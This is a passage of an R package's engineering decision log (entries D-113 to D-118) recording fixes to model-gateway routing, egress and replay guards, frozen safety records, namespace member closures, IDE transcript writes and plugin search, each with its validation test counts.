## D-113 - P08 gateway closure: an empty argument is refused before any dot is read, routing follows the model-level type so a decision-only model without the classifier route is not_available instead of an internal error, and the gptr export and its methods reach NAMESPACE and man/ only when the gateway can run its examples (2026-10-04)

P08 Task 8's plan-literal `R/gptr-gateway.R` (`gptr()`, `gateway_dispatch()` and the
`gptr_gateway` methods) changed in two ways, and one plan step is deferred. The plan's 20 tests
are verbatim except for the once-key reset of the alias test (Task 6's obligation).

1. **An empty argument is refused** (Task 5's obligation, D-102 item 7). `gptr("x", , big)`,
   `gptr("x", )` and a forwarded `w("x", , big)` reached `dot_is_literal(exprs[[i]])` and failed
   with R's `argument is missing, with no default`. The new leaf `dot_empty(exprs)` reads each
   dot expression by index (never binding it to a local, like `dot_sites()`), and `gptr()`
   refuses an empty one before any dot is read: `gptr_error_invalid_argument`, `arg = "..."`,
   message `Argument <i> of the dots is empty.` (no value is echoed). A named formal written
   empty (`model = `) is R's missing argument and keeps its default, as before.
2. **Routing follows the model-level type** (IC-74; 07-local-ollama.md section 2: "P13 must not
   reject Clef because the parent `ollama` provider defaults to chat; both P08 routing and P13
   dispatch use the resolved model"; the coordinator's note: a decision-only classifier model
   routes to System 1, never to chat). The new `gateway_model_type(model)` gives the model-level
   `type` of a call's resolved model through P05's pure `model_resolve(ref, strict = FALSE)`:
   `ollama/clef-flash` and `ollama/clef` are `"classifier"` although `ollama` serves chat,
   `ollama/qwen3:1.7b` is `"chat"`, `jev` is `"classifier"`, a provider spec gives its first
   model's type (else its own), a router spec, a registered router name or `router:<name>` is
   `"router"`, and `NULL` (the configured default), an unresolved reference or a malformed value
   is NA. It never discovers, prepares or refreshes (07 section 2.1) and never signals, so a
   route's `match()` may call it. When no route handled a call that has a prompt and a
   classifier model, `gateway_dispatch()` now signals `gptr_error_not_available` (`member =
   "route:classifier"`, `provided_by = "builtin:system1"`, the message says the model is
   decision-only) instead of the plan's `gptr_error_internal` ("No gateway route handled this
   call"), so such a call is never left to a conversational route. **Task 9's `nested`,
   `continue` and `new` routes decline a model whose `gateway_model_type()` is `"classifier"`**
   (P13's `classifier` route at order 10 takes it first when loaded); the test "without the
   classifier route a decision-only model is not_available (IC-74)" fails if `new` takes it.
3. **NAMESPACE and `man/gptr.Rd` are not generated in this task** (the plan generates them in
   Task 12; Tasks 2 and 7 took their exports early). The roxygen tags are in the source, and the
   document action in a scratch copy produces `export(gptr)`, six `S3method(..., gptr_gateway)`
   lines (`$`, `$<-`, `[[`, `[[<-`, `print`, `utils::.DollarNames`) and `man/gptr.Rd`. Taking
   them now would make R CMD check run the `gptr()` example and the six `@examplesIf
   exists("gptr", mode = "function")` examples of P06 and P13 (`gptr_last()`, the session
   store, budget and object pages, `s1-types.R`) against a gateway without routes ("No gateway
   route handled this call", an example ERROR until Task 9), and `man/gptr.Rd` links
   `gptr_step()` (Task 10; an Rd cross-reference WARNING until then). Tests do not need them:
   the test environment inherits the namespace, so `gptr`, its `$`/`[[`/`print`/`.DollarNames`
   methods dispatch there under `devtools::test()` and R CMD check alike. Task 12 (or the
   first task after Tasks 9 and 10 have landed) takes these lines; a document run in the shared
   tree by another lane must not commit them.

Validation: `progress/P08.md`, Task 8. Red (no `R/gptr-gateway.R`) `^gptr-gateway$`
`[ FAIL 25 | WARN 0 | SKIP 0 | PASS 0 ]` (`dev/.validation/P08/task8-red-final-tests.log`);
against the plan-literal source `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 89 ]`
(`task8-red-adaptations-against-plan-literal.log`: the empty argument, `gateway_model_type()`
missing, the classifier call ending as an internal error); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 120 ]` (`task8-green.log`; the plan's 20 tests give its 74).

**Item 3 closed (2026-10-05, P08 Task 12).** With Tasks 9 and 10 committed, Task 12 took the
deferred lines from a `document` run on a `git archive` copy of `718659d`: `export(gptr)`, the
six `S3method(..., gptr_gateway)` lines, `export()` of `gptr_step`, `gptr_wait`, `gptr_steer`,
`gptr_cancel` and `gptr_on`, and their six Rd pages (`man/gptr.Rd` and five verb pages; no other
plan's line). R CMD check of that copy plus these files runs every example offline, including
the six `@examplesIf exists("gptr", mode = "function")` examples of P06 and P13: `0 errors | 0
warnings | 1 note` (`progress/P08.md`, Task 12).

## D-114 - P08 gateway_run(): the built-in routes leave decision-only models alone, a root run freezes the protected ollama_local_only from human settings, the guards follow the effective endpoint, the call's replay = wins, System 1 images are refused in a conversation, colon model ids stay whole, and P17's test-side trust.get is gone, and (review round 1) a session's own provider record decides egress (never the process-wide record of its id), a routed session honours the call's replay = and router:<name> must name a registered router, and (review round 2) a routed session honours .opts$context = "none" and a router's provider:<level> keeps its level, and (review round 3) a router's choice is judged under the frozen safety record of the run it serves and a session's own provider named alone resolves on a continuation (2026-10-05)

P08 Task 9's plan-literal code (`gateway_run()`, the `builtin:gateway` routes, the guards and
`router.call`) changed in seven ways. The plan's 30 tests are verbatim except one line (item 7).
The first version of this entry landed in `e934f34` (P15's commit staged the whole file); items
3, 4 and 6 and the review round 1 paragraph below are the review round 1 amendment, which landed
in `b8cbb60` (P15's next commit staged the whole file again); the review round 2 sentences of
items 3 and 6 and the review round 2 paragraph are the review round 2 amendment, which landed
in `1b2d566` (P10's commit staged the whole file); the review round 3 sentences of items 2 and 6
and the review round 3 paragraph are the review round 3 amendment.

1. **The built-in routes decline a decision-only model** (IC-74, 07-local-ollama.md section 2;
   D-113 item 2). `nested`, `continue` and `new` match only when `gateway_model_type()` of the
   call's model is not `"classifier"` (`route_conversational()`), so Clef, Clef Flash, `jev` or a
   classifier spec reaches P13's `classifier` route (order 10) or the dispatcher's
   `gptr_error_not_available`; the plan's `new` took every call with a prompt, and the session
   then failed at its first request.
2. **A root run's protected safety record carries `ollama_local_only`** (07 sections 2.1 and 5;
   D-017 item 2; Task 1/3/5 obligations). `gateway_run_start()` passes `opts$safety =
   gateway_run_safety()`: P06's `safety_snapshot()` plus `ollama_local_only =
   settings_local_only("ollama")`, which only the user settings file and the session layer can
   set to `FALSE` (D-094); options, project files, registered specs and `.opts` (refused, D-102)
   cannot. Inside a run it passes nothing, so a child run inherits the outer run's frozen record
   (P06's `run_new()`). A `.run = FALSE` session gets its record when it is started, not when it
   is queued (the pending run options hold none); Task 10 starts pending runs through
   `gateway_run_start()`. The plan never set the field, so every run read the strict default.
   Egress is judged under the same record (review round 3): `gateway_run()` takes a root run's
   record once and hands it to `gateway_guards()` and `gateway_run_start()`, and
   `router_guards()` reads the record of the run driving the routed session
   (`gateway_run_record()`), because P06 calls `router.call` between turns, where
   `run_current()` finds no run. P08's `egress_state()`, `egress_require()`,
   `egress_local_only()` and `egress_can_ask()` take that record (`safety`, by default
   `egress_safety()`: the record of the run on the call stack, an empty one for a run without
   one, `NULL` outside a run). An Ollama exemption needs both the live control and the record,
   and the acknowledgement is asked only when the record's `can_prompt` allows it. Before, a
   routed request was judged under the live settings and `gptr_can_prompt()` while P05's
   preflight read the frozen record, so one request got the weaker guarantee of each: with the
   record relaxed and the session layer tightened during the run, `router.call` exempted an
   Ollama choice that the preflight then did not hold to local-only inference.
3. **The guards follow the effective endpoint of the session's own record** (D-020 item 1,
   D-099; Task 4 obligation). `gateway_guards()` (unless `.opts$context = "none"`) and
   `router_guards()` call `gateway_egress()`, which hands P08's `egress_state()` of the provider
   record the session uses (its rank-0 record included) to `egress_require(pid, st)`, the
   acknowledgement part of `egress_check()` (R/gptr-config.R; `egress_check(provider_id)` is now
   `egress_require(pid, egress_state(provider_get(id)))`). Exempt: offline, or a loopback
   endpoint with Ollama's local-only control in force. The plan skipped the check for any
   provider with `local = TRUE`, so a LAN or remote "local" server got automatic context without
   an acknowledgement; the first version of this item still let `egress_check()` recompute the
   exemption from the process-wide record of the id, so a call-level `lmstudio` (or `vllm`) spec
   at a LAN or remote address was exempted by the built-in loopback record (review round 1). A
   routed session's check is skipped, as `gateway_guards()`'s is, when the run that asks sends no
   automatic context (`gateway_run_context()`: the run's `context` option from the call's
   `.opts$context`, else the `context` setting; IC-29, contract 7.8 `egress_check()`); the
   plan's `router_guards()`, and this entry's first two versions, ignored it (review round 2).
4. **The call's `replay =` overrides the process mode** (contract 3.1: `gptr.replay` is
   "overridden by the call's `replay =`"; IC-45 `replay_mode(arg)`). `gateway_replay_guard()`
   checks the replay mode with the call's argument: `replay = "auto"` lets a call run in a
   replaying process (the hint `replay_guard()` itself gives), and `replay = "replay"` refuses an
   unrecorded provider in a process that is not replaying. The plan ignored the argument. A
   routed session is checked per request: `router_guards()` (also on `router_fallback()`) reads
   the `replay =` of the call whose run is driving the session (`gateway_run_replay()`: the call
   record kept in the run options), since `gateway_guards()` skips `router:` sessions (review
   round 1).
5. **`.opts$system1_images` is refused in a conversation** (07 section 4: images are never
   silently dropped). The built-in routes signal `gptr_error_invalid_argument` (`arg =
   ".opts$system1_images"`) before anything is created; `.opts$images` attaches images to a
   conversation.
6. **Colon model ids stay whole** (IC-74: Ollama tags such as `qwen3:1.7b`).
   `gateway_model_ref()` resolves a reference whole through P05's pure `model_resolve()` (which
   reads a trailing thinking level itself) and accepts `router:<name>` only for a registered
   router (process-wide, or the session's own on a continuation, `session =`), else
   `gptr_error_unknown_model` as the plan's resolution gave, so a mistyped router never reaches
   `router.call`'s default-model fallback (review round 1); the plan split at the
   first `:` and produced `ollama/qwen3:1.7b:1.7b`. `gateway_model_record()` tries the whole
   reference, and `router_model()` reads a `:<suffix>` as a thinking level only when it is one
   (as P05 and P06 do); the plan's version set `thinking` to the tag. A router answer that names
   a provider alone with a level (`fake2:high`) keeps the level, as the plan's version did
   (review round 2). On a continuation, a provider registered for the session alone (a rank-0
   spec) named by its bare id means its first model, as `provider/id` already did; the plan's
   branch looked the id up process-wide only (review round 3).
7. **Test adaptations.** The plan's "a pending session collected without running releases its
   call record [R2]" calls `ev_drain()` after `gc()`: since FIX-1 (D-085) the finalizer defers
   `session_shutdown` to the next safe point, so the release hook runs there. D-092 item 7 is
   done: `local_trust_record()` (comment, definition and its one call) is deleted from
   `tests/testthat/test-skill-discover.R`, which passes against P08's `trust.get` (128).

Known gap, not P08's to fix (recorded for the coordinator): P06's `run_route()` catches every
error of `router.call` and falls back to the default chat model, and `route_default()` checks
neither egress nor replay. So a router whose choice `router.call` refuses (no acknowledgement, or
replay mode) leads to a request to the default model without those checks; a scratch probe
(`router:to_lan` choosing a LAN provider, default a non-offline fake) sent the request in replay
mode without an acknowledgement. P06 should re-signal `gptr_error_egress` and
`gptr_error_not_recorded` from `router.call` (or guard its fallback).

Known gap, P13's file (recorded for the coordinator; found by code reading, not probed): P13's
`s1_guards()` (R/s1-route.R) calls `egress_check(target$model$provider)`, which reads the
process-wide record of that id, so a call-level classifier spec that reuses a built-in loopback
id (for example `ollama`) at a remote address is exempted by the built-in record. P13 should
call `egress_require(<id>, egress_state(target$provider))` as P08's guards now do.

Review round 1 regression tests (`tests/testthat/test-gptr-gateway.R`): "egress reads the
session's own provider record, never the global one of its id" (11: `lmstudio` at a LAN address
and an inline remote `vllm` refused with `gptr_error_egress` by `gptr()` and by `router.call`,
nothing sent, `http_handle` mocked), "a routed session's guards honour the call's replay =
(contract 3.1, IC-45)" (4) and "router:<name> names a registered router; an unknown one is
refused" (9); the colon test expects `unknown_model` for an unregistered `router:somewhere`.
Red against the round-0 source `[ FAIL 10 | WARN 0 | SKIP 0 | PASS 289 ]`
(`task9-fix1-red-final-tests.log`; the LAN `lmstudio` call reached the mocked HTTP layer); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 308 ]` (`task9-fix1-green-gateway.log`).

Review round 2 regression tests: "a routed session's egress check honours .opts$context =
\"none\" (IC-29, 7.8)" (6: an unacknowledged non-local provider a router picks answers a call
with `.opts = list(context = "none")` and the default model gets no request; outside such a run
`router.call` still refuses it with `gptr_error_egress`), the colon test (+3: `router_model()`
of `fake2:high` and `loc:low` keeps the level) and the safety-record test (+1: the tool relaxes
the session layer before the child `gptr()`, and the child's record still has
`ollama_local_only = TRUE`; the previous version passed against a re-snapshot mutation, this one
fails it twice, `task9-fix2-red-inherit-mutation.log`). Red against the round-1 source
`[ FAIL 6 | WARN 0 | SKIP 0 | PASS 312 ]` (`task9-fix2-red.log`: the routed call answered
"fallback answer" from the default model, and the two levels were `NULL`); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 318 ]` (`task9-fix2-green-gateway.log`).

Review round 3 regression tests: "router.call judges egress under the frozen record of the run
it serves (07 sec. 5)" (10: the run froze `ollama_local_only = FALSE`, the router tightens the
session layer and picks `ollama/qwen3:1.7b`, and `router.call` still refuses it with
`gptr_error_egress`, so the call answers from the default model; a run frozen with
`can_prompt = FALSE` is never asked, even when `gptr.interactive` turns `TRUE` during it; no
acknowledgement is recorded and nothing reaches the mocked HTTP layer) and "a continuation names
a provider registered for the session by its bare id" (4). Red against the round-2 source
`[ FAIL 2 | WARN 0 | SKIP 1 | PASS 316 ]` (`task9-fix3-red.log`: the routed call reached P05's
preflight and failed with `gptr_error_not_available`, and `corpx` was `unknown_model`); the
`can_prompt` leg alone, with `router_guards()` reading `egress_safety()` again, fails the same
way (`task9-fix3-red-canprompt.log`: it asked, recorded the acknowledgement and reached the
preflight). Green `[ FAIL 0 | WARN 0 | SKIP 1 | PASS 330 ]` (`task9-fix3-green.log`; the skip is
Task 8's "before the namespace services exist", now that P10 registers `ns.resolve`).

Validation: `progress/P08.md`, Task 9. Red `^gptr-gateway$` `[ FAIL 42 | WARN 0 | SKIP 0 |
PASS 121 ]` (`dev/.validation/P08/task9-red.log`); against the plan-literal source
`[ FAIL 23 | WARN 0 | SKIP 0 | PASS 249 ]` (`task9-red-adaptations-against-plan-literal.log`,
every failure in the adaptation tests or Task 8's IC-74 test); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 284 ]` (`task9-green.log`; the plan's 30 tests give 118,
exactly its 192 - 74).

## D-115 - P13 classifier route core: match and target follow the model's own type, the target is preflighted before the call's values are read, egress follows the effective endpoint and the call's replay = wins, images are checked, keyed and handed to the adapter, meta carries the call's provenance with calibration and usage unknown when unknown, a cached record that does not answer the question is a miss, and an answer whose confidence is unknown is inside the uncertain band (2026-10-05)

P13 Task 8 (`R/s1-route.R`; two small changes in `R/s1-client.R`; `tests/testthat/test-s1-route.R`).
IC-74 (07-local-ollama.md sections 2-5) and the forward notes of D-076, D-077, D-078 and D-080
change the plan-literal code in these ways. The plan's 8 tests (55 expectations) are verbatim
except one assertion (item 4).

1. **Model-level type** (07 section 2). `s1_is_classifier()` reads the type of the resolved model
   (P05's pure `model_resolve(strict = FALSE)`, as P08's `gateway_model_type()` routes), and only
   a model without a type takes its provider's; `s1_target_of()` checks the model's type, not the
   provider's. The plan used the provider's type for a spec or a provider id, so a chat-default
   provider's classifier model (Clef on `ollama`) was refused and a classifier-typed provider's
   chat model matched. A classifier reference whose provider is not registered is
   `gptr_error_unknown_model` (the plan said "not a System 1 model").
2. **Preflight first** (07 section 2.1; D-080 forward note). `s1_call()` and `s1_decide()` run
   `s1_ready()` before the call's values are read or any state is built: P05's pure
   `provider_preflight()` on the classifier's provider, or `s1_emu_ready()` for an emulation
   target. The checked model (with its discovery evidence) feeds the question's decision limits
   (`s1_question(decision =)`, D-077), the cache identity and the provenance. The running run's
   frozen safety record (`run$opts$safety`) travels with the target to `s1_request(opts$safety)`;
   outside a run it is NULL, P05's strict local-only default.
3. **Guards** (D-099, D-114 items 3-4). Every provider that is not `offline` goes through P08's
   `egress_check()`, which itself exempts loopback endpoints; the plan skipped any provider with
   the `local` hint, so a "local" provider with a remote base URL got the user's data without an
   acknowledgement. The call's `replay =` decides the replay guard, as P08's
   `gateway_replay_guard()` does (`replay = "auto"` runs in a replaying process, `"replay"` refuses
   a miss in one that is not); the plan read only the process mode (plan ambiguity 6).
4. **Calibration unknown** (07 section 3; D-078 item 4). A native target's `calibrated` is NA, not
   TRUE; a call's value is the adapter's statement, and next to cached elements it is combined
   conservatively (`s1_calibration()`). The plan assertion `expect_true(attr(d, "meta")$calibrated)`
   for P01's fake (which states NA) is `expect_identical(..., NA)`. Emulation stays FALSE.
5. **Provenance in meta** (07 section 3). `meta` gains `provider`, `api`, `execution`
   ("native"/"emulated"), `locality`, `model_digest`, `server_version` and
   `calibration_provenance`, from `s1_request()`'s provenance, or from the target's model for a
   call answered from the cache (`s1_meta()`).
6. **Usage** (D-076). Unknown counts and cost stay NA in `meta$usage` and the System 1 log row
   (the plan: `%||% 0`); a call answered entirely from the cache made no request, so its usage is
   a known zero and no row is logged.
7. **Cache validity** (D-080 item 5). A record that `s1_cache_answer()` rejects is a miss and is
   asked again; the plan marked every record found as cached.
8. **Images** (07 section 4; D-102, D-114 item 5). `.opts$system1_images` is refused with
   `gptr_error_invalid_argument` unless the target is a native model whose decision record says
   `images = TRUE` (emulation and Jev refuse them, never drop them); their ordered digests and
   MIME types join the cache key (`s1_cache_identity()`), and `s1_request()` hands them to the
   adapter as `opts$images` (encoding and size limits are the Ollama adapter's).
9. **Small fixes.** `s1_engine()` gives "fake" for P01's `fake-classifier` api (its adapter always
   reports "fake", contract 12.1), so a cached call names the same engine as a fresh one and the
   plan's `s1_target()` assertion holds; `.opts$output = "factor"` applies to choices only (a
   decision or score has no levels); an all-NA score summary says `mean NA`, not `mean NaN`;
   `s1_decide()` refuses duplicated argument names, and its no-key message names a local decision
   model as a third way.
10. **Unknown confidence is inside the uncertain band; `uncertain()` values are checked** (review
   round 1; 07 section 3; report 04 section 2.9). An answered choice or score whose confidence is
   unknown (an empty probability map, as Vercel's gateway returns after it re-ran an uncertain
   evaluation on a chat model) cannot show that `min_confidence` is met, so it is inside any band
   above 0 and becomes NA, the given `TRUE`/`FALSE`, the `uncertain()` function's value or, with
   `"stop"`, `gptr_error_s1_uncertain` (whose message then says "or unknown"). The plan's
   `!is.na(conf) & conf < min_confidence` was written when an NA confidence only meant a failed
   element, which still stays out. A value returned by an `uncertain()` function is checked
   against the question, not only coerced: a score must be a number in [0, levels - 1] (the plan
   kept 7 for three levels and turned "high" into NA with a coercion warning), and a decision
   must read as TRUE or FALSE (the plan turned "maybe" into NA).

Validation: `progress/P13.md`, Task 8. Red `^s1-route$` `[ FAIL 16 | WARN 0 | SKIP 0 | PASS 68 ]`
(`dev/.validation/P13/task8-red.log`, every failure `could not find function`); against the
plan-literal code `[ FAIL 22 | WARN 0 | SKIP 0 | PASS 157 ]` (`task8-negative-detail.log`); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 196 ]` (`task8-green.log`: 68 + the plan's 55 + 73 in eight
IC-74/IC-47 tests). Review round 1 (item 10): two tests (23 expectations); against the pre-fix
source `[ FAIL 13 | WARN 1 | SKIP 0 | PASS 206 ]` (`task8-fix1-negative.log`); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 219 ]` (`task8-fix1-green.log`).

## D-116 - P10 member closures and namespaces: a document edit the backend refuses is an error, an execute-only member gets the process ctx and cannot be shadowed by its own schema, hidden plugin members are neither listed nor resolved, a completion pattern that is not a regular expression leaks no warning, and (review round 1) a member whose schema is a function of ctx takes `...`, a primitive `fun` keeps the formals args() gives it, and no argument can shadow the call machinery (2026-10-05)

P10 Task 8's plan-literal `R/tool-namespace.R` (part 2) passes the plan's 10 blocks (51
expectations). Probes against it (`dev/.validation/P10/task8-probe1.R`,
`task8-probe1-plan-literal.log`; after the change `task8-probe1-after.log`) found four defects.
No signature, class, condition field or printed text of the plan changes.
1. **A refused document edit came back as a patch.** `member_edit()` returned
   `ns_routed_patch()` of whatever the `doc.edit` service (P15, contract 7.0: `<gptr_tool_result>
   or NULL`) answered. P15's `doc_edit_service()` answers an error result for a block the user
   edited by hand ("Block ... was edited by hand; it was left unchanged."), so `gptr$edit()` at
   the console returned a `gptr_patch` carrying that text as its message, as if the edit had been
   made. `member_edit()` now signals `gptr_error_tool` (`tool = "edit"`, `status = "error"`, the
   result text as message) for an `is_error` result, as an execute-only member does
   (`ns_generated_fun()`, P02's generated `fun`). The direct tool of Task 10 returns the routed
   result itself, so it is unaffected.
2. **The fallback `fun` of an execute-only member** (a `deferred` spec, or a namespaced spec
   without `fun`; P02 generates `fun` only for `exposure = "r"`) called `execute(input, NULL)`.
   Contract 10.6 gives a dispatch whose caller passed no ctx the process ctx, and P02's generated
   `fun` passes `ctx_default(NULL)`, so an execute that uses `ctx$ui()` or `ctx$get()` failed
   only when called as `gptr$<name>()` from the console. It now passes `ctx_default(NULL)`. Its
   body also read `arg_names`, `exec` and `tool_name` from the member's own frame, so a schema
   property with one of those names shadowed them (`arg_names = "a"` made the call fail with
   "'missing(a)' did not find an argument"). Its body is now a call of an inlined closure on the
   inlined `base::environment()`, as `member_closure()` and P02's generated `fun` already do (G1
   section 2.8).
3. **Hidden plugin members.** IC-37 makes a `hidden` spec callable by gptr code only, and
   `ns_resolve()` refuses it, but `names()`, `.DollarNames()` and `print()` of a `gptr_ns` node
   listed it (`registry_names()`), and a namespace whose tools are all hidden was offered by
   `gptr$<tab>` and resolved to a node that listed them. The new `ns_plugin_keys()` reads the
   namespaced keys whose winning spec is not hidden from `registry_all("tool")`, which leaves lazy
   placeholders unactivated (contract 10.8; a placeholder has no exposure and is kept;
   `task8-probe2-lazy.log`); `ns_plugin_namespaces()` and `names.gptr_ns()` use it.
4. **Completion patterns.** `ns_names()` and `.DollarNames.gptr_ns()` fall back to a prefix match
   when `pattern` is not a regular expression, but `grepl()` warns ("TRE pattern compilation
   error") before it errors, and only the error was caught, so the warning reached the console.
   Both handlers now take the warning too.
5. Documentation only: the roxygen line "Copy-safety [R4]" of `member_describe()` was read as an
   Rd link (`Could not resolve link to topic "R4"` in the document log); it now reads "rule R4".

Review round 1 (`task8-fix1-probe.R`; before `task8-fix1-probe-before.log`, after
`task8-fix1-probe-after.log`) added items 6-8.
6. **A schema that is a function of ctx.** Contract 9.1 lets `parameters` be a `function(ctx)`
   evaluated at freeze, and P02 registers such a spec; for an execute-only spec P02's generated
   `fun` is then `function(...)`. `ns_member_ok()` admits a `deferred` one, so `gptr$<tab>`
   offered it, and a namespace node listed a namespaced one, but `member_closure()` read
   `schema$properties` of the closure and failed ("object of type 'closure' is not
   subsettable"). `ns_schema_formals()` now gives `...` for a schema that is not a list, as P02
   does: the member passes its arguments as the input (`gptr$dyn(a = "x")` reaches `execute`
   with `list(a = "x")`, and the nested gate gets the same list), and its signature is
   `gptr$dyn(...)` (`gptr$pq$dynd(...)` for a namespaced one, not `()`).
7. **A primitive `fun`.** P02's `kind_check_tool()` reads formals through `formals(args(fun))`
   and registers `fun = sum`; `member_closure()`, `ns_formals_text()` and `ns_formals_schema()`
   read `formals(fun)`, which is NULL for a primitive, so the member took no argument
   (`m(1, 2)`: "unused arguments") and printed `gptr$total()`. The new `ns_fun_formals()` reads
   `formals(args(fun))` (`...` for a primitive whose args() is NULL): `gptr$total(..., na.rm =
   FALSE)`.
8. **Arguments named like the call machinery.** Four calls were evaluated in the member's frame
   through symbols, and R's function lookup there finds an argument first, forcing it and calling
   it when it holds a function: `member_fun(...)` (an argument `member_fun = mean` was called in
   place of the member's `fun`, and an unused `member_fun = stop()` was forced), `missing(x)`
   (`missing = identity` made a supplied `x` "missing"), `substitute(x)` (the gate labels) and
   `list(...)` (`list = identity` failed the nested call with "unused argument"). The calls now
   inline base::missing(), base::substitute() and base::list(), and `fun` is called through a
   symbol that names no formal (`member_fun`, dot-prefixed until it differs from all of them)
   bound in the closure's environment, so the error call of a `fun` error still reads
   `member_fun(...)`.

The reviewer's fourth finding needed no source change: the plan's reserved-namespace test never
registered its spec (P02 refuses the namespace `grep`), so `ns_plugin_namespaces()`'s refusal of
a plugin namespace that a member registered later takes was untested. An added block covers it
(one `member_refused` diagnostic after two listings, the member resolves, the plugin's members
do not); without the filter 4 of its 5 expectations fail (`task8-fix1-mutation.R`/`.log`).

Validation: `progress/P10.md`, Task 8. Eight added test blocks (47 expectations). Against the
plan-literal source with the round-0 test file `[ FAIL 10 | WARN 0 | SKIP 0 | PASS 88 ]`
(`task8-red-final-plan-literal.log`); round 1's four blocks (25 expectations) against the round-0
source `[ FAIL 4 | WARN 0 | SKIP 0 | PASS 110 ]` (`task8-fix1-red.log`); green `^tool-namespace$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 129 ]` (`task8-fix1-green.log`: Task 1's 31, the plan's 51 and
the 47 added).

## D-117 - P15 IDE backend and transcript appends: an editor buffer that shows the final newline as an empty last line is clean, transcript lines are appended only to an `.R` transcript, and they are redacted before the event and the write (2026-10-05)

P15 Task 11's plan-literal `doc_ide_upsert()` and `doc_transcript_append()` (`R/doc-io.R`)
changed in three ways. Their interfaces (`doc_ide_upsert(fmt, site, up)`,
`doc_transcript_append(path, lines, session = NULL)`) and the other Task 11 functions
(`doc_ide_edit_range()`, `doc_ide_modify()`, `doc_ide_save()`, `doc_ide_cursor()`) are the plan's;
one internal helper is new, `doc_ide_clean(buffer, path)`. D-107 item 4's Task 11 obligation is
met: `doc_upsert()` sends `rstudio`, `positron` and `vscode` sites to `doc_ide_upsert()` before it
refuses a backend no writer handles.

1. **A buffer that ends in the empty line after the final newline is clean.** Report 14 section
   4.3 saves an RStudio or VS Code buffer, and writes a Positron buffer on disk, only when the
   buffer equals the file. The plan compared `ctx$contents` line for line with
   `doc_read()$lines`, which leaves out the final newline. Ace (RStudio) and Monaco (Positron)
   hold a file that ends with a newline as its lines plus an empty last line (LIKELY: no IDE runs
   here, report 14 section 5.7; styler's RStudio addin `style_active_file()` replaces the range up
   to `length(contents) + 1` with lines that `ensure_last_n_empty()` ends in one empty line). On
   the plan literal a clean RStudio buffer of an ordinary script was therefore never saved, and a
   clean Positron buffer was edited through the id-less API (the active editor, which may be the
   console since positron#16063) instead of on disk, the path report 14 keeps for dirty buffers.
   `doc_ide_clean()` takes both forms: the same lines, or the same lines and `""` when the file
   ends with a newline. That empty line for a file without a final newline stays an edit (not
   saved).
2. **Transcript lines are appended only to an `.R` transcript** (contract 11.5: the console
   transcript is an `.R` file). The plan appended raw lines to any path, with format
   `doc_format_of(path) %||% "r"`. IC-52 also allows `.Rmd`, `.qmd` and `.ipynb` console targets,
   `doc_console_site()` (Task 8) gives `.Rmd`/`.qmd` targets `backend = "transcript"`, and Task
   13's planned `session_tree` hook appends its `# /rewind` note to every document whose blocks
   have that backend (only its console channels check `format == "r"`). On the plan literal that
   note left a notebook that is no longer JSON and became prose (a heading) in R Markdown or
   Quarto, and a `.txt` or extensionless path was created. Any other format now returns FALSE
   with nothing written and no event.
3. **Transcript lines are redacted with the persist profile** before the `document_write` event
   and the write (IC-74, 07 section 6 P15 row: "redacted, consented workflow records"). Task 13's
   console callers redact already; the writer itself now keeps every caller's lines redacted.

IC-74: consent comes first (`doc_upsert()` for editor sites, `doc_consent(ask = FALSE)` for
appends; a new test pins that no editor buffer is edited without consent), a local model's tag
(`ollama/qwen3:8b`) reaches the header in the buffer, and nothing here calls a provider.

Known limits (plan behaviour, not changed): Positron's clean branch writes on disk and does not
move the cursor (the editor reloads on its own, and an id-less cursor call may reach the
console); a document that is no longer RStudio's active source editor is not edited (a notice),
although RStudio could edit it by id, because reading its buffer by id needs
`getSourceEditorContext(id)` (RStudio 2022.06+; review round 1 pins that an editor showing another
file or an untitled buffer is never edited); an editor that reported CRLF lines with their CR
would read as dirty (not verified). Because `doc_ide_clean()` accepts both buffer forms (item 1),
for a file that ends with a newline a buffer whose only unsaved change is the removed final empty
line also reads as clean, as it did on the plan literal's line-for-line comparison: RStudio's
`documentSave()` then saves that edit with the block, and Positron writes the block on disk while
its buffer keeps that change. This stays until a real IDE confirms how each editor reports a
buffer.

Validation: `progress/P15.md`, Task 11. Seven tests added (52 expectations; review round 1 added
the foreign and untitled editor test, 11) after the plan's five (32, verbatim). Against the
plan-literal source with the final test file `[ FAIL 15 | WARN 0 | SKIP 0 | PASS 337 ]`
(`dev/.validation/P15/task11-fix1-adapt-red-plan-literal.log`); green `^doc-io$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 352 ]` (`task11-fix1-green.log`), so every later plan count for
`test-doc-io.R` is 52 higher than the plan's (on top of the D-096 and D-109 additions).

## D-118 - P10 plugin catalog, search and help: `gptr$search()` offers only what resolves and keeps each document's own kind, search sources get a `gptr_ctx`, a catalog service that answers no string adds nothing, and `gptr$help()` hides `hidden` members, lists a primitive's arguments and answers a missing package with text, and (review round 1) search text that is not valid UTF-8 no longer fails `gptr$search()` (2026-10-05)

P10 Task 9's plan-literal `R/tool-namespace.R` (part 3) passes the plan's 5 blocks (47
expectations; `dev/.validation/P10/task9-green0-plan-literal.log`). Probes against it
(`dev/.validation/P10/task9-probe1.R`, `task9-probe1-plan-literal.log`; after the change
`task9-probe1-after.log`) found seven defects. No signature, class, condition field, column or
printed text of the plan changes; the BM25 port, the catalog and the R help pages are unchanged.
1. **Two documents with one id.** `member_search()` mapped hits back to documents with
   `match(id)`, so a `search_source` document whose id equals a tool key (or two sources sharing
   an id) reported the first document's kind and signature for both rows (a `note` document came
   back as `plugin` with the tool's signature). The index is now built over row numbers, so each
   hit keeps its own `kind`, and only `member`, `plugin` and `deferred` documents take their
   tool's catalog line as `signature` (any other document keeps its id).
2. **Search sources got `NULL` for ctx at the console.** Contract 10.6 makes `ctx` the argument
   of every handler (`ctx$session` is `NULL` for process-level dispatch), and IC-69 gives
   `search_source` a `docs(ctx)`; a source that called `ctx$tokens()` or `ctx$get()` failed
   ("attempt to apply non-function") and was skipped. `search_sources()` now passes the live
   session's ctx, else `ctx_default(session)` (the process ctx when there is no session), as
   D-116 item 2 does for execute-only members.
3. **Unresolvable search results.** `ns_search_docs()` offered every namespaced tool, so a plugin
   namespace refused because a member has its name (`ns_plugin_namespaces()`, IC-37) was still
